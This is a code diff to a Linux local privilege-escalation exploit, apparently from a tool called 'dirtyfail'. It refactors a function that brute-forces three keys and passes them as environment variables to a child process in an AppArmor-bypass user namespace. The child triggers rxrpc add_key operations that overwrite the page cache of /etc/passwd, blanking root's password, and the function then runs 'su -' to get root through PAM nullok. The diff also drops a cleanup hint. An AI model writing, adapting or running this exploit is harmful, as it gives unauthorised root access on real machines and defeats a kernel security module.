@@ -835,61 +835,30 @@ df_result_t dirtyfrag_rxrpc_exploit(bool do_shell)
     }
     close(pfd);
 
-    log_ok("all three keys found; entering namespace + firing triggers");
+    log_ok("all three keys found; handing off to bypass child for triggers");
 
-    /* === fork: child does the dirty work in a new userns ============= *
-     *
-     * The triggers must run inside a fresh user/net namespace (rxrpc
-     * sockets and add_key act on the current namespace), but `su`
-     * afterwards must inherit the real uid in the *parent* namespace
-     * so PAM can resolve /etc/shadow. So child = triggers, parent = su.
-     */
-    if (apparmor_bypass_was_armed()) {
-        log_step("AA bypass already armed — skipping inner fork+unshare (rxrpc)");
-        /* Autoload rxrpc.ko by opening a dummy AF_RXRPC socket. */
-        int dummy = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
-        if (dummy >= 0) close(dummy);
+    /* Pass the three K's to the inner via hex-encoded env vars. The
+     * inner runs in the AA bypass userns (where add_key + AF_RXRPC
+     * have CAP_NET_ADMIN); we (parent, init ns) stay here so the
+     * eventual `su -` reaches REAL init-ns root via PAM nullok. */
+    char hex[8 * 2 + 1];
+    #define HEXSET(name, k) do {                                          \
+        for (int i = 0; i < 8; i++) snprintf(hex + i*2, 3, "%02x", k[i]); \
+        setenv(name, hex, 1);                                             \
+    } while (0)
+    HEXSET("DIRTYFAIL_K_A", Ka);
+    HEXSET("DIRTYFAIL_K_B", Kb);
+    HEXSET("DIRTYFAIL_K_C", Kc);
+    #undef HEXSET
+    setenv("DIRTYFAIL_INNER_MODE", "rxrpc", 1);
 
-        int t = open("/etc/passwd", O_RDONLY);
-        if (t < 0) { log_bad("open passwd: %s", strerror(errno)); return DF_EXPLOIT_FAIL; }
-
-        bool ok = do_one_trigger(t, 4, Ka)
-               && do_one_trigger(t, 6, Kb)
-               && do_one_trigger(t, 8, Kc);
-        close(t);
-        if (!ok) return DF_EXPLOIT_FAIL;
-    } else {
-        pid_t child = fork();
-        if (child < 0) { log_bad("fork: %s", strerror(errno)); return DF_EXPLOIT_FAIL; }
-        if (child == 0) {
-            if (!setup_userns(getuid(), getgid())) _exit(1);
-
-            /* Autoload rxrpc.ko by opening a dummy AF_RXRPC socket — the
-             * first add_key("rxrpc", ...) needs it. */
-            int dummy = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
-            if (dummy >= 0) close(dummy);
-
-            int t = open("/etc/passwd", O_RDONLY);
-            if (t < 0) _exit(2);
-
-            if (!do_one_trigger(t, 4, Ka)) _exit(3);
-            if (!do_one_trigger(t, 6, Kb)) _exit(4);
-            if (!do_one_trigger(t, 8, Kc)) _exit(5);
-
-            close(t);
-            _exit(0);
-        }
-
-        int wstat = 0;
-        waitpid(child, &wstat, 0);
-        if (!WIFEXITED(wstat) || WEXITSTATUS(wstat) != 0) {
-            log_bad("child failed (exit %d)",
-                    WIFEXITED(wstat) ? WEXITSTATUS(wstat) : -1);
-            return DF_EXPLOIT_FAIL;
-        }
+    int rc = apparmor_bypass_fork_arm(0, NULL);
+    if (rc != DF_EXPLOIT_OK) {
+        log_bad("inner exploit failed (exit=%d)", rc);
+        return DF_EXPLOIT_FAIL;
     }
 
-    /* Verify in the parent namespace's page cache. */
+    /* Verify in init namespace — page cache is global. */
     int v = open("/etc/passwd", O_RDONLY);
     if (v < 0) { log_bad("verify open: %s", strerror(errno)); return DF_EXPLOIT_FAIL; }
     uint8_t after[16];
@@ -899,7 +868,6 @@ df_result_t dirtyfrag_rxrpc_exploit(bool do_shell)
 
     log_step("/etc/passwd[0..15] now = '%.16s'", (char *)after);
 
-    /* The signature of success is chars 4..5 = "::" (empty password). */
     if (after[4] != ':' || after[5] != ':') {
         log_bad("page cache not in expected shape; trigger may have missed");
         return DF_EXPLOIT_FAIL;
@@ -914,11 +882,55 @@ df_result_t dirtyfrag_rxrpc_exploit(bool do_shell)
         return DF_EXPLOIT_OK;
     }
 
-    log_ok("invoking 'su -' — PAM nullok will accept the empty password");
-    log_hint("after exit, run dirtyfail --cleanup or reboot");
+    log_ok("invoking 'su -' in init ns — PAM nullok accepts empty password → REAL ROOT");
     execlp("su", "su", "-", (char *)NULL);
     log_bad("execlp su: %s", strerror(errno));
     return DF_EXPLOIT_FAIL;
+}
+
+/* ---- inner ---------------------------------------------------------
+ *
+ * Runs in the AA bypass userns. Reads the three K's from
+ * DIRTYFAIL_K_{A,B,C} env vars, fires three do_one_trigger calls.
+ * The fcrypt brute force itself ran in the parent (no caps required).
+ */
+
+static bool hex_to_8b(const char *hex, uint8_t out[8])
+{
+    if (!hex || strlen(hex) != 16) return false;
+    for (int i = 0; i < 8; i++) {
+        unsigned int b;
+        if (sscanf(hex + i*2, "%2x", &b) != 1) return false;
+        out[i] = (uint8_t)b;
+    }
+    return true;
+}
+
+df_result_t dirtyfrag_rxrpc_exploit_inner(void)
+{
+    uint8_t Ka[8], Kb[8], Kc[8];
+    if (!hex_to_8b(getenv("DIRTYFAIL_K_A"), Ka) ||
+        !hex_to_8b(getenv("DIRTYFAIL_K_B"), Kb) ||
+        !hex_to_8b(getenv("DIRTYFAIL_K_C"), Kc)) {
+        log_bad("inner: DIRTYFAIL_K_{A,B,C} not set or invalid");
+        return DF_TEST_ERROR;
+    }
+
+    /* Autoload rxrpc.ko by opening a dummy AF_RXRPC socket. */
+    int dummy = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
+    if (dummy >= 0) close(dummy);
+
+    int t = open("/etc/passwd", O_RDONLY);
+    if (t < 0) {
+        log_bad("inner: open passwd: %s", strerror(errno));
+        return DF_EXPLOIT_FAIL;
+    }
+
+    bool ok = do_one_trigger(t, 4, Ka)
+           && do_one_trigger(t, 6, Kb)
+           && do_one_trigger(t, 8, Kc);
+    close(t);
+    return ok ? DF_EXPLOIT_OK : DF_EXPLOIT_FAIL;
 }
 
 #else  /* not __linux__ */
